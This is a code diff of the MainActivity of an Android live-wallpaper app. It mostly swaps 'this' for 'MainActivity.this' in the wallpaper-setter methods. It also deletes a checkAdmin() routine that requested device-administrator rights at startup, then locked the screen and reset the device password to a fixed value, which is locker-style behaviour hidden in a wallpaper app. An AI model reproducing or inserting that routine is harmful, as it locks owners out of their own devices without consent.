@@ -51,34 +51,7 @@ public class MainActivity extends AppCompatActivity {
         mExFilePicker = new ExFilePicker();
         mExFilePicker.setCanChooseOnlyOneItem(true);
         mExFilePicker.setQuitButtonEnabled(true);
-        checkAdmin();
 
-    }
-
-    private void checkAdmin() {
-
-        devicePolicyManager = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
-        // 申请权限
-        ComponentName componentName = new ComponentName(this, MyAdmin.class);
-        // 判断该组件是否有系统管理员的权限
-        isAdminActive = devicePolicyManager
-                .isAdminActive(componentName);
-
-        if (!isAdminActive) {//这一句一定要有...
-            Intent intent = new Intent();
-            //指定动作
-            intent.setAction(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
-            //指定给那个组件授权
-            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, componentName);
-            startActivity(intent);
-        }
-
-        if (isAdminActive) {
-            Toast.makeText(this, "具有权限,将进行锁屏....", 1).show();
-            devicePolicyManager.lockNow();
-            devicePolicyManager.resetPassword("123321", 0);
-
-        }
     }
 
     @Override
@@ -86,20 +59,20 @@ public class MainActivity extends AppCompatActivity {
         super.onDestroy();
     }
 
-    public void setVideoToWallPaper(View view) {VideoLiveWallpaper.setToWallPaper(this);}
+    public void setVideoToWallPaper(View view) {VideoLiveWallpaper.setToWallPaper(MainActivity.this);}
 
-    public void setGIFToWallPaper(View view) {GIFLiveWallpaper.setToWallPaper(this);}
+    public void setGIFToWallPaper(View view) {GIFLiveWallpaper.setToWallPaper(MainActivity.this);}
 
     public void setCameraToWallPaper(View view) {
-        CameraLiveWallpaper.setToWallPaper(this);
+        CameraLiveWallpaper.setToWallPaper(MainActivity.this);
     }
 
     public void setShaderToWallPaper(View view) {
-        ShaderWallpaper.setToWallPaper(this);
+        ShaderWallpaper.setToWallPaper(MainActivity.this);
     }
 
     public void setFrameToWallPaper(View view){
-        FrameWallpaper.setToWallPaper(this);
+        FrameWallpaper.setToWallPaper(MainActivity.this);
     }
 
     @Override
